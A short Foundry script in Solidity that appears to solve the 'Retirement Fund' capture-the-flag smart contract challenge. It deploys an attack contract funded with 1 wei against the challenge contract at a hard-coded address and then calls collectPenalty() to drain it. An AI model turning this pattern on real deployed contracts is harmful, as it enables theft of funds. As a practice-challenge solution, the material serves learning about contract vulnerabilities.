pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../../src/math-challenge/RetirementFund.sol";

contract MyScript is Script {

    function run() public {
        
        vm.startBroadcast();

        RetirementFundChallenge rfc = RetirementFundChallenge(0xC8CD3259412Eab9A4eFeC6568536172828e3172a);

        RetirementFundAttack rfa = new RetirementFundAttack{value: 1 wei}(payable(address(rfc)));
        
        rfc.collectPenalty();

        vm.stopBroadcast();
    }

}